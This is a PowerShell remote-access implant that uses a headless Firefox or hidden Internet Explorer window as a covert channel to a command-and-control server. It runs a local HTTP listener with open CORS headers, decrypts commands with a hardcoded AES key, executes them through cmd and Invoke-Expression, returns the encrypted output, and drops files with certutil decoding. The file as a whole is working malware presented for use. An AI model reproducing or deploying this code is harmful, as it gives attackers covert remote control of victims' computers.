function Create-AesManagedObject($key, $IV) {
	$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
	$aesManaged.BlockSize = 128
	$aesManaged.KeySize = 256
	if ($IV) {
		if ($IV.getType().Name -eq "String") {
			$aesManaged.IV = $IV
		}
		else {
			$aesManaged.IV = $IV
		}
	}
	$aesManaged.Key = [system.Text.Encoding]::UTF8.GetBytes($key)
	$aesManaged
}
function Create-AesKey() {
	$aesManaged = Create-AesManagedObject
	$aesManaged.GenerateKey()
	return $( Convert-BytesToHEX $aesManaged.Key)
}
function Encrypt-String($key, $unencryptedString) {
	$key = (Get-StringHash32 $key)
	$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
	$aesManaged = Create-AesManagedObject $key
	$encryptor = $aesManaged.CreateEncryptor()
	$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
	[byte[]] $fullData = $aesManaged.IV + $encryptedData
	$aesManaged.Dispose()
	return $( Convert-BytesToHEX $fullData)
}
function Get-StringHash32 ($String) {
	$StringBuilder = New-Object System.Text.StringBuilder 
	[System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{ 
		[Void]$StringBuilder.Append($_.ToString("x2")) 
	} 
	return ($StringBuilder.ToString()).Substring(0,32)
}
function Decrypt-String($key, $encryptedStringWithIV) {
	$key = (Get-StringHash32 $key)
	$bytes = $( Convert-HexToBytes $encryptedStringWithIV)
	$IV = $bytes[0..15]
	$aesManaged = Create-AesManagedObject $key $IV
	$decryptor = $aesManaged.CreateDecryptor();
	$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
	$aesManaged.Dispose()
	[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Convert-BytesToHEX {
	param($DEC)
	$tmp = ''
	ForEach ($value in $DEC){
		$a = "{0:x}" -f [Int]$value
		if ($a.length -eq 1){
			$tmp += '0' + $a
		} else {
			$tmp += $a
		}
	}
	$tmp
}
function Convert-HexToBytes {
	param($HEX)
	$HEX = $HEX -split '(..)' | ? { $_ }
	ForEach ($value in $HEX){
		[Convert]::ToInt32($value,16)
	}
}
$UUID = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 

#### Easiest implementation for using Firefox/Chrome as communcation channel
#### Change URL to IP/domain of C&C 
$controllerUrl = 'http://192.168.0.8'
$args_test = '-headless ' + $controllerUrl + '/control/controller/' + $UUID
[system.Diagnostics.Process]::Start("firefox",$args_test)

#### Hardcoded option for using Firefox/Chrome as communication channel
# $controllerUrl = 'http://192.168.0.8/control/controller/' + $UUID
# $browser_path = 'c:\Program Files\Mozilla Firefox\firefox.exe'
# $args=$controllerUrl
# Add-Type -AssemblyName System.Web
# $browser_proc = Start-Process -FilePath $browser_path -ArgumentList $args -passthru

#### Best way to run IE as the communication channel
# Add-Type -AssemblyName System.Web
# $controllerUrl = 'http://192.168.0.8/control/controller/' + $UUID
# $IE = New-Object -ComObject 'InternetExplorer.Application'
# $IE.Visible = $false
# $IE.Navigate($controllerUrl)
# while ($IE.busy) {
	# start-sleep -milliseconds 100 
	# } 
# Start-Sleep -Seconds 2
# $IE.Refresh()

$routes = @{'/exit'={exit} 
	'*' = { return '<html><body>Hello world!</body></html>' }} 
$url = 'http://localhost:8899/' 
$listener = New-Object System.Net.HttpListener 
$listener.Prefixes.Add($url) 
$listener.Start() 
while ($listener.IsListening) { 
	$context = $listener.GetContext() 
	$request = $context.request 
	$output = '' 
    $body = $request.InputStream
    $reader = New-Object System.IO.StreamReader ($body, $request.ContentEncoding)
    $output = $reader.ReadToEnd()
    $reader.Close()
	$aeskey = 'e5ae3c8c-f0bf-11e5-9e33-d3b532c10628'
	$output = Decrypt-String $aeskey $output
	$output = [System.Web.HttpUtility]::UrlDecode($output) 
	$output = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))
	if ($output -like '*|*') { 
	$command,$key = $output -split ':',2 
	$data, $filename = $command -split '\|',2 
	$filename = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($filename)) 
	$tmpfile = New-TemporaryFile
	$tmpfilepath = $tmpfile.FullName
	$data >> $tmpfile.FullName
	$certutil = 'certutil -decode ' + $tmpfile.FullName + ' ' + $filename
	$requestUrl = $context.Request.Url 
	$response = $context.Response 
	$response.Headers.Add('Access-Control-Allow-Origin: *') 
	$response.Headers.Add('Access-Control-Origin: *') 
	if ($key -eq $UUID) { $cmd = 'cmd /c ' + $certutil + ' 2>&1' 
		$cmdOutput = Invoke-Expression $cmd 
 		$cmdOutput=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmdOutput))
		$cmdOutput = Encrypt-String $aeskey $cmdOutput
		$buffer = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput) 
		$response.ContentLength64 = $buffer.Length 
		$response.OutputStream.Write($buffer, 0, $buffer.Length) 
		$response.Close()
		}
	Remove-Item $tmpfile.FullName -Force
	} else {
	$output = [System.Web.HttpUtility]::UrlDecode($output) 
	$output,$key = $output -split ':',2 
	$requestUrl = $context.Request.Url 
	$response = $context.Response 
	$response.Headers.Add('Access-Control-Allow-Origin: *') 
	$response.Headers.Add('Access-Control-Origin: *') 
	if ($key -eq $UUID) { $cmd = 'cmd /c ' + $output + ' 2>&1' 
		$cmdOutput = Invoke-Expression $cmd | Out-String 
		$cmdOutput=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmdOutput))
		$cmdOutput = Encrypt-String $aeskey $cmdOutput
		$buffer = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput) 
		$response.ContentLength64 = $buffer.Length 
		$response.OutputStream.Write($buffer, 0, $buffer.Length) 
		$response.Close()
		} 
	}
}
